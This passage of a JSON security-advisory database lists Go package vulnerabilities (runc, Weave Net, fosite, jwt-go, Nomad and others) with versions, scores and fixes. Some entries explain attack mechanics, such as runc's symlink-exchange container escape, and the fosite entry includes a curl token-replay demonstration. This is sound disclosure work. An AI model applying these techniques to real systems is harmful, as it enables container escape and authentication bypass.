"2023-08-29T22:08:18Z", "published": "2021-05-21T16:11:49Z", "aliases": [], "summary": "Incorrect handling of credential expiry by /nats-io/nats-server", "details": "(This advisory is canonically https://advisories.nats.io/CVE/CVE-2020-26892.txt )\n\n## Problem Description\n\nNATS nats-server through 2020-10-07 has Incorrect Access Control because of how expired credentials are handled.\n\nThe NATS accounts system has expiration timestamps on credentials; the <https://github.com/nats-io/jwt> library had an API which encouraged misuse and an `IsRevoked()` method which misused its own API.\n\nA new `IsClaimRevoked()` method has correct handling and the nats-server has been updated to use this.  The old `IsRevoked()` method now always returns true and other client code will have to be updated to avoid calling it.\n\nThe CVE identifier should cover any application using the old JWT API, where the nats-server is one of those applications.\n\n\n## Affected versions\n\n#### JWT library\n\n * all versions prior to 1.1.0\n * fixed after nats-io/jwt PR 103 landed (2020-10-06)\n\n#### NATS Server\n\n * Version 2 prior to 2.1.9\n   + 2.0.0 through and including 2.1.8 are vulnerable.\n * fixed with nats-io/nats-server PRs 1632, 1635, 1645\n\n\n## Impact\n\nTime-based credential expiry did not work.\n\n\n## Workaround\n\nHave credentials which only expire after fixes can be deployed.\n\n\n## Solution\n\nUpgrade the JWT dependency in any application using it.\n\nUpgrade the NATS server if using NATS Accounts.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-server/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/nats-io/jwt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/nats-io/nats-server/security/advisories/GHSA-2c64-vj8g-vwrq"}, {"type": "WEB", "url": "https://github.com/nats-io/jwt/commit/e11ce317263cef69619fc1ca743b195d02aa1d8a"}, {"type": "WEB", "url": "https://advisories.nats.io/CVE/CVE-2020-26892.txt"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-20T22:19:22Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-cj2h-ww36-v932", "modified": "2021-05-13T14:53:36Z", "published": "2021-05-18T18:20:26Z", "aliases": ["CVE-2020-7956"], "summary": "Improper Certificate Validation in HashiCorp Nomad", "details": "HashiCorp Nomad and Nomad Enterprise up to 0.10.2 incorrectly validated role/region associated with TLS certificates used for mTLS RPC, and were susceptible to privilege escalation. Fixed in 0.10.3.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.10.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7956"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/issues/7003"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/pull/7023"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/nomad/"}], "database_specific": {"cwe_ids": ["CWE-295"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-13T14:53:36Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-c3xm-pvg7-gh7r", "modified": "2021-05-21T19:34:43Z", "published": "2021-05-25T18:44:42Z", "aliases": ["CVE-2021-30465"], "summary": "mount destinations can be swapped via symlink-exchange to cause mounts outside the rootfs", "details": "### Summary\n\nrunc 1.0.0-rc94 and earlier are vulnerable to a symlink exchange attack whereby\nan attacker can request a seemingly-innocuous container configuration that\nactually results in the host filesystem being bind-mounted into the container\n(allowing for a container escape). CVE-2021-30465 has been assigned for this\nissue.\n\nAn attacker must have the ability to start containers using some kind of custom\nvolume configuration, and while recommended container hardening mechanisms such\nas LSMs (AppArmor/SELinux) and user namespaces will restrict the amount of\ndamage an attacker could do, they do not block this attack outright. We have a\nreproducer using Kubernetes (and the below description mentions\nKubernetes-specific paths), but this is not a Kubernetes-specific issue.\n\nThe now-released [runc v1.0.0-rc95][release] contains a fix for this issue, we\nrecommend users update as soon as possible.\n\n[release]: https://github.com/opencontainers/runc/releases/tag/v1.0.0-rc95\n\n### Details\n\nIn circumstances where a container is being started, and runc is mounting\ninside a volume shared with another container (which is conducting a\nsymlink-exchange attack), runc can be tricked into mounting outside of the\ncontainer rootfs by swapping the target of a mount with a symlink due to a\ntime-of-check-to-time-of-use (TOCTTOU) flaw. This is fairly similar in style to\nprevious TOCTTOU attacks (and is a problem we are working on solving with\nlibpathrs).\n\nHowever, this alone is not useful because this happens inside a mount namespace\nwith `MS_SLAVE` propagation applied to `/` (meaning that the mount doesn't\nappear on the host -- it's only a \"host-side mount\" inside the container's\nnamespace). To exploit this, you must have additional mount entries in the\nconfiguration that use some subpath of the mounted-over host path as a source\nfor a subsequent mount.\n\nHowever, it turns out with some container orchestrators (such as Kubernetes --\nthough it is very likely that other downstream users of runc could have similar\nbehaviour be accessible to untrusted users), the existence of additional volume\nmanagement infrastructure allows this attack to be applied to gain access to\nthe host filesystem without requiring the attacker to have completely arbitrary\ncontrol over container configuration.\n\nIn the case of Kubernetes, this is exploitable by creating a symlink in a\nvolume to the top-level (well-known) directory where volumes are sourced from\n(for instance,\n`/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir`), and then\nusing that symlink as the target of a mount. The source of the mount is an\nattacker controlled directory, and thus the source directory from which\nsubsequent mounts will occur is an attacker-controlled directory. Thus the\nattacker can first place a symlink to `/` in their malicious source directory\nwith the name of a volume, and a subsequent mount in the container will\nbind-mount `/` into the container.\n\nApplying this attack requires the attacker to start containers with a slightly\npeculiar volume configuration (though not explicitly malicious-looking such as\nbind-mounting `/` into the container explicitly), and be able to run malicious\ncode in a container that shares volumes with said volume configuration. It\nhelps the attacker if the host paths used for volume management are well known,\nthough this is not a hard requirement.\n\n### Patches\nThis has been patched in runc 1.0.0-rc95, and users should upgrade as soon as\npossible. The patch itself can be found [here](https://github.com/opencontainers/runc/commit/0ca91f44f1664da834bc61115a849b56d22f595f).\n\n### Workarounds\n\nThere are no known workarounds for this issue.\n\nHowever, users who enforce running containers with more confined security\nprofiles (such as reduced capabilities, not running code as root in the\ncontainer, user namespaces, AppArmor/SELinux, and seccomp) will restrict what\nan attacker can do in the case of a container breakout -- we recommend users\nmake use of strict security profiles if possible (most notably user namespaces\n-- which can massively restrict the impact a container breakout can have on the\nhost system).\n\n### References\n* [commit](https://github.com/opencontainers/runc/commit/0ca91f44f1664da834bc61115a849b56d22f595f)\n* [seclists public disclosure](https://www.openwall.com/lists/oss-security/2021/05/19/2)\n\n### Credit\n\nThanks to Etienne Champetier for discovering and disclosing this vulnerability,\nto Noah Meyerhans for writing the first draft of this patch, and to Samuel Karp\nfor testing it.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [our issue tracker](https://github.com/opencontainers/runc/issues).\n* Email us at <security@opencontainers.org>.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/opencontainers/runc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.0-rc95"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.0.0-rc94"}}], "references": [{"type": "WEB", "url": "https://github.com/opencontainers/runc/security/advisories/GHSA-c3xm-pvg7-gh7r"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-30465"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/commit/0ca91f44f1664da834bc61115a849b56d22f595f"}, {"type": "WEB", "url": "https://bugzilla.opensuse.org/show_bug.cgi?id=1185405"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/releases"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2023/03/msg00023.html"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/35ZW6NBZSBH5PWIT7JU4HXOXGFVDCOHH/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4HOARVIT47RULTTFWAU7XBG4WY6TDDHV/"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202107-26"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20210708-0003/"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2021/05/19/2"}], "database_specific": {"cwe_ids": ["CWE-22", "CWE-362", "CWE-367"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-21T19:34:43Z", "nvd_published_at": "2021-05-27T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-59qg-grp7-5r73", "modified": "2021-05-24T21:05:31Z", "published": "2021-05-27T19:00:08Z", "aliases": ["CVE-2020-11091"], "summary": "Weave Net clusters susceptible to MitM attacks via IPv6 rogue router advertisements", "details": "### Impact\nAn attacker able to run a process as root in a container is able to respond to DNS requests from the host and thereby insert themselves as a fake service.\n\nIn a cluster with an IPv4 internal network, if IPv6 is not totally disabled on the host (via ipv6.disable=1 on the kernel cmdline), it will be either unconfigured or configured on some interfaces, but it\u2019s pretty likely that ipv6 forwarding is disabled, ie /proc/sys/net/ipv6/conf//forwarding == 0. Also by default, /proc/sys/net/ipv6/conf//accept_ra == 1. The combination of these 2 sysctls means that the host accepts router advertisements and configure the IPv6 stack using them.\n\nBy sending \u201crogue\u201d router advertisements, an attacker can reconfigure the host to redirect part or all of the IPv6 traffic of the host to the attacker controlled container.\nEven if there was no IPv6 traffic before, if the DNS returns A (IPv4) and AAAA (IPv6) records, many HTTP libraries will try to connect via IPv6 first then fallback to IPv4, giving an opportunity to the attacker to respond.\nIf by chance you also have on the host a vulnerability like last year\u2019s RCE in apt (CVE-2019-3462), you can now escalate to the host.\n\n### Patches\nWeave Net version 2.6.3 (to be released soon) will disable the accept_ra option on the veth devices that it creates.\n\n### Workarounds\nUsers should not run containers with CAP_NET_RAW capability.  This has been the advice from Weave Net for years.\nhttps://www.weave.works/docs/net/latest/kubernetes/kube-addon/#-securing-the-setup\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the Weave Net repo](https://github.com/weaveworks/weave/issues/new)\n* Join the <a href=\"https://slack.weave.works/\" target=\"_blank\">Weave Users Slack</a>.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/weaveworks/weave"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.6.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/weaveworks/weave/security/advisories/GHSA-59qg-grp7-5r73"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-11091"}, {"type": "WEB", "url": "https://github.com/weaveworks/weave/commit/15f21f1899060f7716c70a8555a084e836f39a60"}], "database_specific": {"cwe_ids": ["CWE-350"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-24T21:05:31Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-v3q9-2p3m-7g43", "modified": "2023-08-29T23:07:22Z", "published": "2021-05-24T16:57:52Z", "aliases": ["CVE-2020-15222"], "summary": "Token reuse in Ory fosite", "details": "### Impact\n\nWhen using client authentication method \"private_key_jwt\" [[1]](https://openid.net/specs/openid-connect-core-1_0.html#ClientAuthentication), OpenId specification says the following about assertion `jti`:\n\n> A unique identifier for the token, which can be used to prevent reuse of the token. These tokens MUST only be used once, unless conditions for reuse were negotiated between the parties\n\nHydra does not seem to check the uniqueness of this `jti` value. Here is me sending the same token request twice, hence with the same `jti` assertion, and getting two access tokens:\n\n```\n$ curl --insecure --location --request POST 'https://localhost/_/oauth2/token' \\\n   --header 'Content-Type: application/x-www-form-urlencoded' \\\n   --data-urlencode 'grant_type=client_credentials' \\\n   --data-urlencode 'client_id=c001d00d-5ecc-beef-ca4e-b00b1e54a111' \\\n   --data-urlencode 'scope=application openid' \\\n   --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \\\n   --data-urlencode 'client_assertion=eyJhb [...] jTw'\n{\"access_token\":\"zeG0NoqOtlACl8q5J6A-TIsNegQRRUzqLZaYrQtoBZQ.VR6iUcJQYp3u_j7pwvL7YtPqGhtyQe5OhnBE2KCp5pM\",\"expires_in\":3599,\"scope\":\"application openid\",\"token_type\":\"bearer\"}\u23ce\n$ curl --insecure --location --request POST 'https://localhost/_/oauth2/token' \\\n   --header 'Content-Type: application/x-www-form-urlencoded' \\\n   --data-urlencode 'grant_type=client_credentials' \\\n   --data-urlencode 'client_id=c001d00d-5ecc-beef-ca4e-b00b1e54a111' \\\n   --data-urlencode 'scope=application openid' \\\n   --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \\\n   --data-urlencode 'client_assertion=eyJhb [...] jTw'\n{\"access_token\":\"wOYtgCLxLXlELORrwZlmeiqqMQ4kRzV-STU2_Sollas.mwlQGCZWXN7G2IoegUe1P0Vw5iGoKrkOzOaplhMSjm4\",\"expires_in\":3599,\"scope\":\"application openid\",\"token_type\":\"bearer\"}\n```\n\n### Patches\n\nThis issue is patched in 0.31.0.\n\n### Workarounds\n\nDo not allow clients to use `private_key_jwt`.\n\n### References\n\nhttps://openid.net/specs/openid-connect-core-1_0.html#ClientAuthentication", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ory/fosite"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.31.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ory/fosite/security/advisories/GHSA-v3q9-2p3m-7g43"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15222"}, {"type": "WEB", "url": "https://github.com/ory/fosite/commit/0c9e0f6d654913ad57c507dd9a36631e1858a3e9"}, {"type": "PACKAGE", "url": "https://github.com/ory/fosite"}, {"type": "WEB", "url": "https://github.com/ory/fosite/releases/tag/v0.31.0"}, {"type": "WEB", "url": "https://openid.net/specs/openid-connect-core-1_0.html#ClientAuthentication"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0110"}], "database_specific": {"cwe_ids": ["CWE-287", "CWE-345"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-24T12:52:00Z", "nvd_published_at": "2020-09-24T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-88jf-7rch-32qc", "modified": "2023-08-30T11:23:31Z", "published": "2021-05-18T20:31:18Z", "aliases": ["CVE-2020-7668"], "summary": "github.com/unknwon/cae Path Traversal vulnerability", "details": "The ExtractTo function doesn't securely escape file paths in zip archives which include leading or non-leading \"..\". This allows an attacker to add or replace files system-wide.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/unknwon/cae"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7668"}, {"type": "WEB", "url": "https://github.com/unknwon/cae/commit/07971c00a1bfd9dc171c3ad0bfab5b67c2287e11"}, {"type": "PACKAGE", "url": "https://github.com/unknwon/cae"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0041"}, {"type": "WEB", "url": "https://snyk.io/research/zip-slip-vulnerability"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMUNKNWONCAETZ-570384"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T20:32:28Z", "nvd_published_at": "2020-06-23T19:38:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2jx2-76rc-2v7v", "modified": "2023-09-18T19:38:35Z", "published": "2021-05-12T18:16:32Z", "aliases": ["CVE-2017-1000056"], "summary": "Kubernetes Privilege Escalation", "details": "Kubernetes version 1.5.0-1.5.4 is vulnerable to a privilege escalation in the PodSecurityPolicy admission plugin resulting in the ability to make use of any existing PodSecurityPolicy object.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0"}, {"fixed": "1.5.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-1000056"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/43459"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/7fef0a4f6a44ea36f166c39fdade5324eff2dd5e"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}], "database_specific": {"cwe_ids": ["CWE-862"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-09-08T00:01:04Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-w73w-5m7g-f7qc", "modified": "2023-08-29T18:46:17Z", "published": "2021-05-18T21:08:21Z", "aliases": ["CVE-2020-26160"], "summary": "Authorization bypass in github.com/dgrijalva/jwt-go", "details": "jwt-go allows attackers to bypass intended access restrictions in situations with `[]string{}` for `m[\"aud\"]` (which is allowed by the specification). Because the type assertion fails, \"\" is the value of aud. This is a security problem if the JWT token is presented to a service that lacks its own audience check. There is no patch available and users of jwt-go are advised to migrate to [golang-jwt](https://github.com/golang-jwt/jwt) at version 3.2.1", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/dgrijalva/jwt-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "3.2.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/dgrijalva/jwt-go/v4"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "4.0.0-preview1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26160"}, {"type": "WEB", "url": "https://github.com/dgrijalva/jwt-go/issues/422"}, {"type": "WEB", "url": "https://github.com/dgrijalva/jwt-go/issues/462"}, {"type": "WEB", "url": "https://github.com/dgrijalva/jwt-go/pull/426"}, {"type": "WEB", "url": "https://github.com/dgrijalva/jwt-go/commit/ec0a89a131e3e8567adcb21254a5cd20a70ea4ab"}, {"type": "PACKAGE", "url": "https://github.com/dgrijalva/jwt-go"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0017"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMDGRIJALVAJWTGO-596515"}], "database_specific": {"cwe_ids": ["CWE-287", "CWE-755"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-18T20:54:59Z", "nvd_published_at": "2020-09-30T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-grfp-q2mm-hfp6", "modified": "2021-11-19T14:43:47Z", "published": "2021-05-24T17:00:05Z", "aliases": ["CVE-2020-15234"], "summary": "Redirect URL matching ignores character casing", "details": "### Impact\n\nBefore version v0.34.1, the OAuth 2.0 Client's registered redirect URLs and the redirect URL provided at the OAuth2 Authorization Endpoint where compared using `strings.ToLower` while they should have been compared with a simple string match:\n\n1. Registering a client with allowed redirect URL `https://example.com/callback`\n2. Performing OAuth2 flow and requesting redirect URL `https://example.com/CALLBACK`\n3. Instead of an error (invalid redirect URL), the browser is redirected to `https://example.com/CALLBACK` with a potentially successful OAuth2 response, depending on the state of the overall OAuth2 flow (the user might still deny the request for example).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ory/fosite"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.34.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ory/fosite/security/advisories/GHSA-grfp-q2mm-hfp6"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15234"}, {"type": "WEB", "url": "https://github.com/ory/fosite/commit/cdee51ebe721bfc8acca0fd0b86b030ca70867bf"}, {"type": "PACKAGE", "url": "https://github.com/ory/fosite"}], "database_specific": {"cwe_ids": ["CWE-178", "CWE-20", "CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-21T22:15:37Z", "nvd_published_at": "2020-10-02T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3f8r-4qwm-r7jf", "modified": "2021-10-13T17:25:40Z", "published": "2021-05-18T15:39:16Z", "aliases": ["CVE-2019-12405"], "summary": "Improper Authentication in Apache Traffic Control", "details": "Improper authentication is possible in Apache Traffic Control versions 3.0.0 and 3.0.1 if LDAP is enabled for login in the Traffic Ops API component. Given a username for a user that can be authenticated via LDAP, it is possible to improperly authenticate as that user without that user's correct password.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/apache/trafficcontrol"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.0.2-RC1"}]}], "database_specific": {"last_known_affected_version_range": "<= 3.0.1"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-12405"}, {"type": "WEB", "url": "https://github.com/apache/trafficcontrol/commit/f780aff77a52d52a37b4d1cc3e8e801c0b557356"}, {"type": "PACKAGE", "url": "https://github.com/apache/trafficcontrol"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/e128e9d382f3b0d074e2b597ac58e1d92139394509d81ddbc9e3700e@%3Cusers.trafficcontrol.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r3c675031ac220b5eae64a9c84a03ee60045c6045738607dca4a96cb8@%3Ccommits.trafficcontrol.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/rc8bfd7d4f71d61e9193efcd4699eccbab3c202ec1d75ed9d502f08bf@%3Ccommits.trafficcontrol.apache.org%3E"}, {"type": "WEB", "url": "https://support.f5.com/csp/article/K84141859"}, {"type": "WEB", "url": "https://support.f5.com/csp/article/K84141859?utm_source=f5support&amp;utm_medium=RSS"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-17T21:00:28Z", "nvd_published_at": "2019-09-09T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9jcx-pr2f-qvq5", "modified": "2023-08-29T21:48:23Z", "published": "2021-05-18T18:34:25Z", "aliases": ["CVE-2018-17419"], "summary": "miekg/dns parsing error leads to nil pointer dereference and DoS", "details": "An issue was discovered in `setTA` in `scan_rr.go` in the Miek Gieben DNS library before 1.0.10 for Go. A `dns.ParseZone()` parsing error causes a segmentation violation, leading to denial of service.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/miekg/dns"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.10"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-17419"}, {"type": "WEB", "url": "https://github.com/miekg/dns/issues/742"}, {"type": "WEB", "url": "https://github.com/miekg/dns/pull/745/commits/f71d7d9d77d439b30a5e50900df5b1f988a50e5e"}, {"type": "WEB", "url": "https://github.com/miekg/dns/commit/501e858f679edecd4a38a86317ce50271014a80d"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0028"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-11T00:44:23Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-7gcp-w6ww-2xv9", "modified": "2021-05-21T22:17:06Z", "published": "2021-05-24T16:59:53Z", "aliases": ["CVE-2020-15229"], "summary": "Path traversal and files overwrite with unsquashfs in singularity", "details": "### Impact\n\nDue to insecure handling of path traversal and the lack of path sanitization within `unsquashfs` (a distribution provided utility used by Singularity), it is possible to overwrite/create any files on the host filesystem during the extraction of a crafted squashfs filesystem.\n\nSquashfs extraction occurs automatically for unprivileged execution of Singularity (either `--without-suid` installation or with `allow setuid = no`) when a user attempts to run an image which:\n\n- is a local SIF image or a single file containing a squashfs filesystem\n- is pulled from remote sources `library://` or `shub://`\n\nImage build is also impacted in a more serious way as it is often performed by the root user, allowing an attacker to overwrite/create files leading to a system compromise.  Bootstrap methods `library`, `shub` and `localimage` trigger a squashfs extraction.\n\n### Patches\n\nThis issue is addressed in Singularity 3.6.4.\n\nAll users are advised to upgrade to 3.6.4 especially if they use Singularity mainly for building image as root user.\n\n### Workarounds\n\nThere is no solid workaround except to temporarily avoid use of unprivileged mode with single file images, in favor of sandbox images instead. Regarding image build, temporarily avoid building from `library` and `shub` sources, and as much as possible use `--fakeroot` or a VM to limit potential impact.\n\n### For more information\n\nGeneral questions about the impact of the advisory / changes made in the 3.6.0 release can be asked in the:\n\n* [Singularity Slack Channel](https://bit.ly/2m0g3lX)\n* [Singularity Mailing List](https://groups.google.com/a/lbl.gov/forum/??sdf%7Csort:date#!forum/singularity)\n\nAny sensitive security concerns should be directed to: security@sylabs.io\n\nSee our Security Policy here: https://sylabs.io/security-policy", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sylabs/singularity"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.1.1"}, {"fixed": "3.6.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/hpcng/singularity/security/advisories/GHSA-7gcp-w6ww-2xv9"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15229"}, {"type": "WEB", "url": "https://github.com/hpcng/singularity/pull/5611"}, {"type": "WEB", "url": "https://github.com/hpcng/singularity/commit/eba3dea260b117198fdb6faf41f2482ab2f8d53e"}, {"type": "WEB", "url": "https://github.com/hpcng/singularity/blob/v3.6.4/CHANGELOG.md#security-related-fixes"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00070.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00071.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-11/msg00009.html"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-21T22:17:06Z", "nvd_published_at": "2020-10-14T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jr34-mff8-pc6f", "modified": "2021-05-04T22:00:21Z", "published": "2021-05-18T18:27:36Z", "aliases": ["CVE-2019-19029"], "summary": "SQL Injection in Cloud Native Computing Foundation Harbor", "details": "Cloud Native Computing Foundation Harbor prior to 1.8.6 and 1.9.3 allows SQL Injection via user-groups in the VMware Harbor Container Registry for the Pivotal Platform.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.7.0"}, {"fixed": "1.8.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.9.0"}, {"fixed": "1.9.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/goharbor/harbor/security/advisories/GHSA-qcfv-8v29-469w"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-19029"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/security/advisories"}, {"type": "WEB", "url": "https://tanzu.vmware.com/security/cve-2019-19029"}], "database_specific": {"cwe_ids": ["CWE-89"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-04T22:00:21Z", "nvd_published_at": "2020-03-20T03:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-75pc-qvwc-jf3g", "modified": "2023-10-02T15:01:12Z", "published": "2021-05-18T18:20:48Z", "aliases": ["CVE-2020-12757"], "summary": "Improper Input Validation in HashiCorp Vault", "details": "HashiCorp Vault and Vault Enterprise 1.4.x before 1.4.2 in Go package github.com/hashicorp/vault-plugin-secrets-gcp/plugin has Incorrect Access Control.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], 